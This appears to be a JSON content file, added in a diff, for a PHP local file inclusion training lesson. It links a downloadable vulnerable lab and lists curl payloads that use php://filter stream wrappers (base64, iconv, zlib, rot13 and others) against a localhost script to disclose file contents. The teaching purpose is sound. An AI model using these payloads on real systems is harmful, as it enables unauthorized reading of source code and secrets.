@@ -1,0 +1,173 @@
+[
+    {
+        "id": "download-lfi-lab",
+        "type": "download",
+        "title": "LFI Practice Lab",
+        "text": "Download the vulnerable PHP lab and payload collection.",
+        "fileName": "lfi-input-lab.zip",
+        "url": "/downloads/lfi-input-lab.zip",
+        "size": "4kb"
+    },
+    {
+        "type": "order_block",
+        "id": "lfi-step-1",
+        "text": "We will examine each stream filter one by one."
+    },
+
+    {
+        "type": "section_heading",
+        "id": "encoding-filters",
+        "text": "Encoding Filters"
+    },
+    
+
+    {
+        "type": "code_block",
+        "id": "base64-encode-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.base64-encode/resource=secret-script.php\""
+    },
+    {
+        "type": "order_block",
+        "id": "base64-encode-explain",
+        "text": "Encodes file content into Base64 format and prevents PHP execution."
+    },
+
+    {
+        "type": "code_block",
+        "id": "base64-decode-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.base64-decode/resource=secret-script.php\""
+    },
+    {
+        "type": "order_block",
+        "id": "base64-decode-explain",
+        "text": "Decodes Base64 encoded content back into original form."
+    },
+
+    {
+        "type": "code_block",
+        "id": "base64-chain-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.base64-encode|convert.base64-decode/resource=secret-script.php\""
+    },
+    {
+        "type": "order_block",
+        "id": "base64-chain-explain",
+        "text": "Encodes and then decodes the content. Final result behaves like direct file inclusion."
+    },
+
+    {
+        "type": "code_block",
+        "id": "quoted-printable-encode-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.quoted-printable-encode/resource=secret-script.php\""
+    },
+    {
+        "type": "order_block",
+        "id": "quoted-printable-encode-explain",
+        "text": "Encodes special characters into quoted-printable format (example: < becomes =3C)."
+    },
+
+    {
+        "type": "code_block",
+        "id": "quoted-printable-decode-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.quoted-printable-decode/resource=secret-script.php\""
+    },
+    {
+        "type": "order_block",
+        "id": "quoted-printable-decode-explain",
+        "text": "Decodes quoted-printable encoded content back to normal text."
+    },
+
+    {
+        "type": "code_block",
+        "id": "iconv-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.iconv.UTF-8.UTF-16/resource=secret-script.php\""
+    },
+    {
+        "type": "order_block",
+        "id": "iconv-explain",
+        "text": "Converts character encoding from UTF-8 to UTF-16, modifying underlying byte structure."
+    },
+
+    {
+        "type": "section_heading",
+        "id": "compression-filters",
+        "text": "Compression Filters"
+    },
+
+    {
+        "type": "code_block",
+        "id": "zlib-deflate-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=zlib.deflate/resource=secret-script.php\""
+    },
+    {
+        "type": "order_block",
+        "id": "zlib-deflate-explain",
+        "text": "Compresses the file content using zlib compression."
+    },
+
+    {
+        "type": "code_block",
+        "id": "zlib-inflate-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=zlib.inflate/resource=secret-script.php\""
+    },
+    {
+        "type": "order_block",
+        "id": "zlib-inflate-explain",
+        "text": "Decompresses previously compressed zlib content."
+    },
+
+    {
+        "type": "section_heading",
+        "id": "string-filters",
+        "text": "String Filters"
+    },
+
+    {
+        "type": "code_block",
+        "id": "rot13-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=string.rot13/resource=secret-script.php\""
+    },
+    {
+        "type": "order_block",
+        "id": "rot13-explain",
+        "text": "Applies ROT13 substitution cipher to alphabetic characters."
+    },
+
+    {
+        "type": "code_block",
+        "id": "toupper-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=string.toupper/resource=secret-script.php\""
+    },
+    {
+        "type": "order_block",
+        "id": "toupper-explain",
+        "text": "Converts alphabetic characters to uppercase."
+    },
+
+    {
+        "type": "code_block",
+        "id": "tolower-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=string.tolower/resource=secret-script.php\""
+    },
+    {
+        "type": "order_block",
+        "id": "tolower-explain",
+        "text": "Converts alphabetic characters to lowercase."
+    },
+
+    {
+        "type": "section_heading",
+        "id": "other-filters",
+        "text": "Other Filters"
+    },
+
+    {
+        "type": "code_block",
+        "id": "dechunk-example",
+        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=dechunk/resource=secret-script.php\""
+    },
+    {
+        "type": "order_block",
+        "id": "dechunk-explain",
+        "text": "Removes HTTP chunked transfer encoding from content."
+    }
+]
